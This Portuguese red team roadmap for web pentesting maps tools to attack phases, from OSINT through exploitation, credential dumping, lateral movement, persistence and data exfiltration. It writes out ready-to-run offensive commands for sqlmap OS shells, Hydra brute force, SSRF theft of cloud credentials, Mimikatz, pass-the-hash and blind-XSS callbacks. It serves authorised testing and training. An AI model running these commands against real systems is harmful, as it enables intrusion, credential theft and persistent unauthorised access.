# Red Team — Roteiro de Ferramentas para Pentest Web

> **Ambiente controlado e autorizado.** Este material é destinado a profissionais de segurança ofensiva atuando sob escopo contratual definido (Rules of Engagement). O uso indevido destas técnicas fora de um ambiente autorizado é ilegal.

---

## Sumário

1. [Visão Geral do Fluxo](#1-visão-geral-do-fluxo)
2. [Fase 0 — Preparação do Ambiente](#2-fase-0--preparação-do-ambiente)
3. [Fase 1 — Reconhecimento Passivo (OSINT)](#3-fase-1--reconhecimento-passivo-osint)
4. [Fase 2 — Reconhecimento Ativo](#4-fase-2--reconhecimento-ativo)
5. [Fase 3 — Enumeração e Mapeamento](#5-fase-3--enumeração-e-mapeamento)
6. [Fase 4 — Análise de Vulnerabilidades](#6-fase-4--análise-de-vulnerabilidades)
7. [Fase 5 — Exploração (Exploitation)](#7-fase-5--exploração-exploitation)
8. [Fase 6 — Pós-Exploração](#8-fase-6--pós-exploração)
9. [Fase 7 — Persistência e Movimentação Lateral](#9-fase-7--persistência-e-movimentação-lateral)
10. [Fase 8 — Exfiltração e Prova de Impacto](#10-fase-8--exfiltração-e-prova-de-impacto)
11. [Fase 9 — Limpeza e Relatório](#11-fase-9--limpeza-e-relatório)
12. [Mapa de Conexão entre Ferramentas](#12-mapa-de-conexão-entre-ferramentas)
13. [Referências e Frameworks](#13-referências-e-frameworks)

---

## 1. Visão Geral do Fluxo

```
┌─────────────┐    ┌────-─────────┐    ┌─────────────┐    ┌─────────────┐
│  PREPARAÇÃO │───▶│   RECON      │───▶│  ENUMERAÇÃO │───▶│  ANÁLISE DE │
│  DO AMBIENTE│    │  PASSIVO +   │    │  E MAPEAM.  │    │  VULNS      │
└─────────────┘    │  ATIVO       │    └──────┬──────┘    └──────┬──────┘
                   └─────-────────┘           │                  │
                                              ▼                  ▼
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  RELATÓRIO  │◀───│ EXFILTRAÇÃO │◀───│    PÓS-     │◀───│ EXPLORAÇÃO  │
│  E LIMPEZA  │    │ E IMPACTO   │    │ EXPLORAÇÃO  │    │             │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
```

A lógica é cíclica: achados em uma fase alimentam as anteriores. Uma credencial obtida na exploração pode reabrir a enumeração de novos alvos.

---

## 2. Fase 0 — Preparação do Ambiente

O objetivo aqui é montar a estação de trabalho e garantir anonimato operacional.

### Sistema Operacional

| Ferramenta | Finalidade |
|---|---|
| **Kali Linux** | Distribuição principal com +600 ferramentas pré-instaladas |
| **Parrot OS Security** | Alternativa ao Kali, mais leve, com ferramentas de anonimato nativas |
| **Commando VM** | Ambiente Windows para pentest (útil para Active Directory) |

### Anonimato e Infraestrutura

| Ferramenta | Finalidade |
|---|---|
| **ProxyChains** | Encadeia proxies (SOCKS4/5, HTTP) para rotear tráfego de qualquer ferramenta CLI |
| **Tor** | Rede de anonimato para reconhecimento passivo |
| **Mullvad / ProtonVPN** | VPNs sem log para camada adicional de anonimato |
| **Tmux / Screen** | Multiplexador de terminal — manter sessões persistentes |
| **Covenant / Mythic C2** | Framework de Comando e Controle para operações prolongadas |

### Gerenciamento de Notas

| Ferramenta | Finalidade |
|---|---|
| **CherryTree** | Árvore hierárquica de notas com screenshots |
| **Obsidian** | Markdown interligado — ideal para mapear relações entre ativos |
| **Ghostwriter** | Plataforma de relatório colaborativo para Red Teams |

**Conexão com a próxima fase →** Com o ambiente pronto e o tráfego protegido via ProxyChains + VPN, iniciamos a coleta passiva sem tocar o alvo.

---

## 3. Fase 1 — Reconhecimento Passivo (OSINT)

> **Princípio:** Extrair o máximo de informação *sem enviar um único pacote* ao alvo.

### Infraestrutura e Superfície de Ataque

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **Shodan** | Motor de busca de dispositivos conectados à internet | `shodan search hostname:alvo.com.br` — retorna portas abertas, banners de serviço, versões de software, certificados SSL, headers HTTP. Filtros como `vuln:CVE-2024-XXXX` identificam hosts já conhecidamente vulneráveis |
| **Censys** | Similar ao Shodan, foco em certificados e TLS | Descobrir subdomínios via certificados emitidos (Certificate Transparency) |
| **Shodan Facets** | Agregação estatística dos resultados Shodan | `shodan stats --facets port,org,os net:x.x.x.0/24` — perfil completo da rede |
| **Google Dorks** | Operadores avançados de busca | `site:alvo.com.br filetype:pdf`, `inurl:admin`, `intitle:"index of"` |
| **FOCA** | Extração de metadados de documentos públicos | Descobre usernames, paths internos, versões de software a partir de PDFs, DOCs e PPTs públicos |
| **theHarvester** | Coleta emails, subdomínios, IPs e nomes de hosts | `theHarvester -d alvo.com.br -b all` |
| **Maltego** | Plataforma visual de OSINT com transforms automáticos | Mapeia relações entre domínios, emails, pessoas, IPs, redes sociais |

### Reconhecimento de Pessoas e Credenciais

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **Hunter.io** | Descobre padrões de email corporativo | Identifica formato `nome.sobrenome@alvo.com.br` |
| **LinkedIn + PhantomBuster** | Scraping de perfis de funcionários | Gera wordlists de usernames baseadas em funcionários reais |
| **Have I Been Pwned / DeHashed** | Verifica se emails/domínios estão em leaks | Credenciais vazadas podem ser reutilizadas (password reuse) |
| **Wayback Machine** | Snapshots históricos de sites | Encontrar páginas removidas, diretórios antigos, endpoints descontinuados |
| **SecurityTrails** | Histórico de DNS | Registros A, MX, NS históricos — revela infraestrutura passada que pode ainda estar ativa |

### DNS e Subdomínios (Passivo)

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **Amass (modo passivo)** | Enumeração massiva de subdomínios via APIs | `amass enum -passive -d alvo.com.br` |
| **Subfinder** | Enumeração rápida de subdomínios | `subfinder -d alvo.com.br -all` |
| **crt.sh** | Certificate Transparency logs | `curl "https://crt.sh/?q=%.alvo.com.br&output=json"` |
| **DNSDumpster** | Mapeamento visual de DNS | Interface web que gera grafo da infraestrutura DNS |

**Conexão com a próxima fase →** Agora temos subdomínios, IPs, emails, tecnologias e possíveis credenciais. É hora de validar tocando o alvo diretamente.

---

## 4. Fase 2 — Reconhecimento Ativo

> **Princípio:** Interagir diretamente com o alvo para confirmar e expandir as descobertas do OSINT.

### Varredura de Portas e Serviços

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **Nmap** | Scanner de portas, serviços e OS fingerprinting | `nmap -sC -sV -O -p- -T4 --script=vuln alvo.com.br -oA scan_completo` |
| **Masscan** | Varredura ultra-rápida de portas (todo o range /0 se necessário) | `masscan -p1-65535 --rate=10000 x.x.x.0/24` — depois refinar com Nmap |
| **RustScan** | Wrapper rápido sobre Nmap | `rustscan -a alvo.com.br -- -sC -sV` |
| **Unicornscan** | Varredura assíncrona de portas | Alternativa ao Masscan para scans stealth |

### Fingerprinting Web

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **WhatWeb** | Identifica tecnologias web (CMS, frameworks, linguagens) | `whatweb -a 3 https://alvo.com.br` |
| **Wappalyzer** | Extensão de browser para tech stack | Identifica React, Angular, WordPress, Nginx, PHP, etc. |
| **Netcraft** | Fingerprinting de servidor e histórico de hosting | Histórico de IPs, OS, server software |
| **WafW00f** | Detecta Web Application Firewalls | `wafw00f https://alvo.com.br` — essencial saber se existe WAF antes de qualquer fuzzing |

**Conexão com a próxima fase →** Sabemos as portas abertas, serviços, versões e tecnologias. Hora de enumerar cada serviço em profundidade.

---

## 5. Fase 3 — Enumeração e Mapeamento

> **Princípio:** Extrair informações detalhadas de cada serviço descoberto — diretórios, endpoints, parâmetros, APIs.

### Enumeração de Diretórios e Arquivos

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **Gobuster** | Brute-force de diretórios e subdomínios | `gobuster dir -u https://alvo.com.br -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50` |
| **Feroxbuster** | Enumeração recursiva de diretórios (Rust) | `feroxbuster -u https://alvo.com.br -w wordlist.txt --depth 3` |
| **ffuf** | Fuzzer web ultra-rápido e flexível | `ffuf -u https://alvo.com.br/FUZZ -w wordlist.txt -mc 200,301,302,403` |
| **Dirsearch** | Enumeração com extensões automáticas | `dirsearch -u https://alvo.com.br -e php,asp,aspx,jsp,html,js` |

### Enumeração de APIs e Endpoints

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **Kiterunner** | Brute-force de rotas de API REST/GraphQL | `kr scan https://api.alvo.com.br -w routes-large.kite` |
| **Arjun** | Descobre parâmetros HTTP ocultos | `arjun -u https://alvo.com.br/page -m GET,POST` |
| **ParamSpider** | Coleta parâmetros de URLs do Wayback Machine | `paramspider -d alvo.com.br` |
| **GAP (GetAllUrls + Params)** | Pipeline gau + análise de parâmetros | `gau alvo.com.br \| uro \| grep "=" > params.txt` |

### Crawling e Mapeamento da Aplicação

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **Burp Suite Pro** | Proxy interceptador — **ferramenta central do pentest web** | Spider automático, interceptação de requests, análise de respostas, repetição de requests |
| **OWASP ZAP** | Alternativa open-source ao Burp | Proxy + spider + scanner ativo integrados |
| **Caido** | Proxy moderno (Rust), alternativa ao Burp | Interface limpa, bom para APIs |
| **Hakrawler** | Crawler rápido de URLs | `hakrawler -url https://alvo.com.br -depth 3` |
| **Katana** | Crawler da ProjectDiscovery | `katana -u https://alvo.com.br -d 5 -jc` (extrai JS endpoints) |

### JavaScript Analysis

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **LinkFinder** | Extrai endpoints de arquivos JS | `linkfinder -i https://alvo.com.br/app.js -o cli` |
| **SecretFinder** | Encontra API keys, tokens e segredos em JS | `secretfinder -i https://alvo.com.br/main.js -o cli` |
| **JSParser** | Parsing de JS para endpoints | Alternativa ao LinkFinder |
| **RetireJS** | Detecta bibliotecas JS com CVEs conhecidos | `retire --js --path /caminho/do/js/` |

**Conexão com a próxima fase →** Agora temos um mapa completo da aplicação: diretórios, endpoints, parâmetros, APIs, arquivos JS e suas secrets. Hora de analisar cada ponto para vulnerabilidades.

---

## 6. Fase 4 — Análise de Vulnerabilidades

> **Princípio:** Identificar vulnerabilidades de forma automatizada e manual, priorizando por criticidade e explorabilidade.

### Scanners Automatizados

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **Nuclei** | Scanner baseado em templates YAML | `nuclei -u https://alvo.com.br -t cves/ -t misconfigurations/ -t exposures/ -severity critical,high` |
| **Nikto** | Scanner clássico de vulnerabilidades web | `nikto -h https://alvo.com.br -Tuning x` |
| **Burp Suite Scanner** | Scanner ativo integrado ao Burp Pro | Escaneia cada endpoint mapeado durante o crawling |
| **OWASP ZAP Active Scan** | Scanner ativo do ZAP | Alternativa gratuita ao Burp Scanner |
| **Nessus / OpenVAS** | Scanners de vulnerabilidades de infraestrutura | Complementam o scan web com vulns de rede/SO |

### Testes Específicos por Vulnerabilidade

| Vulnerabilidade | Ferramenta | Uso |
|---|---|---|
| **SQL Injection** | **SQLMap** | `sqlmap -u "https://alvo.com.br/page?id=1" --batch --dbs --risk=3 --level=5` |
| **XSS** | **XSStrike** | `xsstrike -u "https://alvo.com.br/search?q=test"` |
| **XSS** | **Dalfox** | `dalfox url "https://alvo.com.br/search?q=test" --blind https://seu-collaborator.com` |
| **SSRF** | **SSRFmap** | Testa payloads SSRF em parâmetros que recebem URLs |
| **SSTI** | **tplmap** | `tplmap -u "https://alvo.com.br/page?name=test"` |
| **LFI/RFI** | **LFISuite** | Automatiza testes de Local/Remote File Inclusion |
| **CORS** | **CORScanner** | `cors https://alvo.com.br` — verifica misconfigurações CORS |
| **CSRF** | **Burp Suite** | Gera PoC de CSRF automaticamente |
| **XXE** | **XXEinjector** | Testa XML External Entity em endpoints que aceitam XML |
| **Desserialização** | **ysoserial** | Gera payloads para desserialização Java/.NET |
| **JWT** | **jwt_tool** | `jwt_tool <token> -M at` — testa alg:none, brute force de secret, key confusion |
| **Subdomain Takeover** | **Subjack / can-i-take-over-xyz** | `subjack -w subdomains.txt -t 50 -ssl` |

### Análise de CMS

| CMS | Ferramenta | Uso |
|---|---|---|
| **WordPress** | **WPScan** | `wpscan --url https://alvo.com.br -e vp,vt,u --api-token <token>` |
| **Joomla** | **JoomScan** | `joomscan -u https://alvo.com.br` |
| **Drupal** | **Droopescan** | `droopescan scan drupal -u https://alvo.com.br` |

**Conexão com a próxima fase →** Vulnerabilidades identificadas e priorizadas. Hora de transformar achados em acesso.

---

## 7. Fase 5 — Exploração (Exploitation)

> **Princípio:** Explorar vulnerabilidades confirmadas para obter acesso, dados ou execução de código.

### Frameworks de Exploração

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **Metasploit Framework** | Framework completo de exploração | `msfconsole` → `search <cve>` → `use exploit/...` → `set RHOSTS` → `exploit` |
| **Cobalt Strike** | Plataforma comercial de Red Team (C2 + exploração) | Beacon, malleable C2 profiles, pivoting integrado |
| **Sliver** | C2 open-source, alternativa ao Cobalt Strike | Implants multiplataforma, mTLS/WireGuard/HTTP(S)/DNS |
| **Havoc** | C2 moderno, pós-exploitation | Similar ao Cobalt Strike, open-source |

### Exploração Web Direta

| Cenário | Ferramenta/Técnica | Detalhamento |
|---|---|---|
| **SQLi → Shell** | **SQLMap** | `sqlmap -u "<url>" --os-shell` ou `--file-write` para upload de webshell |
| **File Upload → RCE** | **Burp + Webshell** | Bypass de extensão (.php5, .phtml, .phar), content-type, magic bytes |
| **SSTI → RCE** | **tplmap** | Injeta template que executa comandos no servidor |
| **SSRF → Cloud Metadata** | **Manual / SSRFmap** | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| **Desserialização → RCE** | **ysoserial / ysoserial.net** | Gera payload → envia no cookie/header/body serializado |
| **JWT Forging** | **jwt_tool** | Forja tokens com permissões elevadas após descobrir a secret |

### Brute Force e Credential Stuffing

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **Hydra** | Brute force de protocolos (HTTP, SSH, FTP, etc.) | `hydra -L users.txt -P passwords.txt alvo.com.br http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` |
| **Medusa** | Alternativa ao Hydra | Suporte a múltiplos protocolos simultâneos |
| **Patator** | Brute forcer modular em Python | Mais flexível para cenários complexos |
| **CeWL** | Gera wordlists customizadas a partir do site alvo | `cewl https://alvo.com.br -d 3 -m 5 -w wordlist.txt` |
| **Mentalist / CUPP** | Gera wordlists baseadas em perfis de pessoas | Dados do OSINT alimentam senhas prováveis |

**Conexão com a próxima fase →** Acesso obtido. Agora é escalar privilégios e entender o que temos em mãos.

---

## 8. Fase 6 — Pós-Exploração

> **Princípio:** Escalar privilégios, coletar credenciais e mapear a rede interna.

### Escalação de Privilégios

| Plataforma | Ferramenta | Uso prático |
|---|---|---|
| **Linux** | **LinPEAS** | `./linpeas.sh` — enumera SUID, capabilities, cron jobs, permissões inseguras |
| **Linux** | **Linux Exploit Suggester** | Sugere exploits de kernel baseados na versão |
| **Linux** | **GTFOBins** | Referência de binários que podem escalar privilégio |
| **Windows** | **WinPEAS** | Equivalente do LinPEAS para Windows |
| **Windows** | **PowerUp** | Script PowerShell para privesc em Windows |
| **Windows** | **Seatbelt** | Coleta informações de segurança do host Windows |
| **Windows** | **SharpUp** | Versão C# do PowerUp |

### Dump de Credenciais

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **Mimikatz** | Extrai senhas em claro, hashes, tickets Kerberos | `sekurlsa::logonpasswords`, `lsadump::dcsync` |
| **LaZagne** | Recupera senhas armazenadas em aplicações | Browsers, email clients, databases, WiFi |
| **Responder** | Captura hashes NTLMv2 na rede | `responder -I eth0 -wrf` |
| **CrackMapExec / NetExec** | Swiss army knife para redes Windows | `crackmapexec smb 10.0.0.0/24 -u user -p pass --sam` |
| **Hashcat** | Quebra de hashes via GPU | `hashcat -m 1000 hashes.txt rockyou.txt -r rules/best64.rule` |
| **John the Ripper** | Quebra de hashes (CPU) | `john --wordlist=rockyou.txt hashes.txt` |

**Conexão com a próxima fase →** Com credenciais e privilégios elevados, é hora de se mover lateralmente e garantir persistência.

---

## 9. Fase 7 — Persistência e Movimentação Lateral

> **Princípio:** Manter acesso e expandir o foothold na rede.

### Movimentação Lateral

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **CrackMapExec / NetExec** | Testa credenciais em massa, executa comandos remotos | `nxc smb 10.0.0.0/24 -u admin -H <hash> --exec-method smbexec -x "whoami"` |
| **Evil-WinRM** | Shell WinRM com funcionalidades extras | `evil-winrm -i 10.0.0.5 -u admin -H <hash>` |
| **Impacket** | Coleção de scripts Python para protocolos Windows | `psexec.py`, `wmiexec.py`, `smbexec.py`, `secretsdump.py` |
| **Chisel** | Túnel TCP sobre HTTP (pivoting) | Criar proxy SOCKS5 através de uma máquina comprometida |
| **Ligolo-ng** | Pivoting moderno sem necessidade de SOCKS | Tunelamento transparente de rede |
| **sshuttle** | VPN-over-SSH | `sshuttle -r user@pivot 10.0.0.0/24` |
| **Rubeus** | Kerberoasting, AS-REP Roasting, ticket manipulation | `Rubeus.exe kerberoast /outfile:hashes.txt` |
| **BloodHound** | Mapeia caminhos de ataque no Active Directory | Coleta com SharpHound → visualiza no BloodHound → identifica paths para Domain Admin |

### Persistência

| Técnica | Ferramenta/Método | Detalhamento |
|---|---|---|
| **Web Shell** | Webshell ofuscado em diretório não monitorado | p0wny-shell, weevely, ou shell customizado |
| **Scheduled Task / Cron** | Tarefa agendada que reconecta ao C2 | Persistência que sobrevive a reboots |
| **SSH Keys** | Adicionar chave pública ao `authorized_keys` | Acesso SSH persistente sem credenciais |
| **Golden Ticket** | Mimikatz + krbtgt hash | Acesso irrestrito ao domínio AD |
| **Reverse Shell persistente** | Netcat / Socat / systemd service | Reconexão automática ao C2 |

**Conexão com a próxima fase →** Com acesso persistente e mobilidade na rede, é hora de demonstrar impacto real ao cliente.

---

## 10. Fase 8 — Exfiltração e Prova de Impacto

> **Princípio:** Demonstrar o impacto real de um atacante — sem causar dano ao ambiente de produção.

### Exfiltração de Dados (PoC)

| Ferramenta | O que faz | Uso prático |
|---|---|---|
| **DNScat2** | Exfiltração via túnel DNS | Bypass de firewalls que não inspecionam DNS |
| **PacketWhisper** | Exfiltração stealth via DNS | Codifica dados em consultas DNS legítimas |
| **CloakifyFactory** | Ofusca dados exfiltrados em formatos inocentes | Transforma binários em listas de emojis, IPs, etc. |
| **rclone** | Sync de arquivos com cloud storage | Exfiltração para S3, GDrive, etc. |

### Provas de Impacto

| Ação | Evidência |
|---|---|
| Acesso a dados sensíveis | Screenshots de bancos de dados com PII (ofuscado no relatório) |
| Controle de servidor | Output de `whoami`, `hostname`, `ifconfig` |
| Movimentação lateral | Mapa de hosts acessados via BloodHound |
| Escalonamento de privilégio | De usuário web → root/SYSTEM |
| Bypass de controles | Evidência de WAF bypass, 2FA bypass, etc. |

**Conexão com a próxima fase →** Impacto demonstrado. Hora de limpar rastros e documentar tudo.

---

## 11. Fase 9 — Limpeza e Relatório

### Limpeza

- Remover todas as webshells, backdoors e artefatos implantados
- Limpar entradas de log criadas durante o teste (quando autorizado)
- Remover contas criadas durante o teste
- Reverter alterações de configuração
- Documentar tudo o que foi alterado para que o Blue Team possa verificar

### Relatório

| Ferramenta | O que faz |
|---|---|
| **Ghostwriter** | Plataforma de relatório para Red Teams |
| **Pwndoc** | Gerador de relatórios de pentest |
| **SysReptor** | Relatórios de pentest colaborativos |
| **Dradis** | Framework de colaboração e relatório |

### Estrutura do Relatório

```
1. Sumário Executivo (para gestão)
2. Escopo e Metodologia
3. Classificação de Risco (CVSS)
4. Achados Detalhados
   ├── Descrição da vulnerabilidade
   ├── Evidências (screenshots, requests/responses)
   ├── Impacto
   ├── Probabilidade de exploração
   └── Recomendação de correção
5. Cadeia de Ataque (Kill Chain narrativa)
6. Recomendações Priorizadas
7. Anexos Técnicos
```

---

## 12. Mapa de Conexão entre Ferramentas

```
Shodan/Censys ──┐
theHarvester ───┤
Amass/Subfinder ┤──▶ Lista de Ativos ──▶ Nmap/Masscan ──▶ Portas/Serviços
Google Dorks ───┤                                              │
crt.sh ─────────┘                                              ▼
                                                     WhatWeb/WafW00f
                                                            │
                    ┌───────────────────────────────────────┘
                    ▼
        Burp Suite (HUB CENTRAL) ◀──── ffuf/Gobuster/Katana
                    │
                    ├──▶ Nuclei ──────────▶ CVEs confirmados ──▶ Metasploit
                    ├──▶ SQLMap ──────────▶ Dump de DB ────────▶ Credenciais
                    ├──▶ XSStrike/Dalfox ▶ XSS PoC
                    ├──▶ jwt_tool ────────▶ Token forjado ─────▶ Privesc
                    └──▶ Manual testing ─▶ Business Logic bugs
                                              │
                                              ▼
                            LinPEAS/WinPEAS ──▶ Privesc ──▶ Mimikatz
                                                              │
                                              BloodHound ◀────┘
                                                  │
                                                  ▼
                                          Domain Admin ──▶ Relatório
```

---

## 13. Referências e Frameworks

### Metodologias

- **OWASP Testing Guide v4.2** — Referência principal para pentest web
- **PTES (Penetration Testing Execution Standard)** — Framework completo de pentest
- **MITRE ATT&CK** — Matriz de táticas e técnicas de adversários
- **Cyber Kill Chain (Lockheed Martin)** — Modelo de fases de ataque

### Wordlists e Payloads

| Recurso | Conteúdo |
|---|---|
| **SecLists** | Coleção definitiva de wordlists (diretórios, senhas, usernames, fuzzing) |
| **PayloadsAllTheThings** | Payloads para todas as vulnerabilidades web |
| **FuzzDB** | Database de padrões de ataque e fuzzing |
| **HackTricks** | Wiki gigante de técnicas de pentest |
| **GTFOBins / LOLBAS** | Binários nativos que podem ser abusados (Linux/Windows) |

### Treinamento

| Plataforma | Foco |
|---|---|
| **HackTheBox** | Labs práticos de pentest |
| **TryHackMe** | Trilhas guiadas para iniciantes e avançados |
| **PortSwigger Web Security Academy** | Labs gratuitos de vulnerabilidades web |
| **PentesterLab** | Exercícios práticos progressivos |
| **VulnHub** | VMs vulneráveis para prática offline |

---
